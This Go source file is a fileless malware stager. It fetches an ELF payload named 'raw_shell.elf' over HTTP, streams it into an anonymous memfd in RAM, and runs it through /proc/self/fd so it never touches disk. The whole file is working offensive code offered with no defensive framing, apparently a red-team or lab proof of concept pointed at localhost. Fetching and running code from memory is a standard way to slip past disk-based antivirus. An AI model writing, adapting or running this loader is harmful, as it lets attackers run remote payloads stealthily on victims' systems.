package main

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"os/exec"

	"golang.org/x/sys/unix"
)

func main() {

	url := "http://localhost:80/raw_shell.elf"
	memfdName := "test_memfd_exec"

	fmt.Printf("[+] Fetching payload from %s....\n", url)
	resp, err := http.Get(url)
	if err != nil {
		log.Fatalf("[-] HTTP request failed: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		log.Fatalf("[-] Unexpected HTTP Status: %d", resp.StatusCode)
	}

	fd, err := unix.MemfdCreate(memfdName, unix.MFD_CLOEXEC)
	if err != nil {
		log.Fatalf("[-] Memfd create failed: %v", err)
	}
	fmt.Printf("[+] Created anonymous memfd. File descriptor: %d\n", fd)

	memFile := os.NewFile(uintptr(fd), memfdName)
	defer memFile.Close()

	written, err := io.Copy(memFile, resp.Body)
	if err != nil {
		log.Fatalf("[-] Failed to copy payload to memory : %v", err)
	}
	fmt.Printf("[+] Successfully streamed %d bytes directly into RAM.\n", written)

	_, err = memFile.Seek(0, io.SeekStart)
	if err != nil {
		log.Fatalf("[-] Failed to seek start of memfd: %v", err)
	}

	procPath := fmt.Sprintf("/proc/self/fd/%d", fd)
	fmt.Printf("[+] Forking and executing binary via %s...\n", procPath)

	cmd := exec.Command(procPath)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Stdin = os.Stderr

	if err := cmd.Run(); err != nil {
		log.Fatalf("[-] Execution failed: %v", err)
	}
}
